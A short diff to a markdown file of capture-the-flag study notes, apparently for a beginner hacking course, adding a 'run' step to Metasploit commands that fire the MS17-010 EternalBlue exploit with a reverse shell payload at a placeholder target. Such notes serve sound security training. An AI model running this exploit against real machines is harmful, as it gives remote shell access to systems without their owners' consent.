@@ -120,6 +120,7 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   use exploit/windows/smb/ms17_010_eternalblue
   set payload generic/shell_reverse_tcp
   set rhosts <target_ip>
+  run
   ```
 - What is the content of the flag.txt file?
   ```
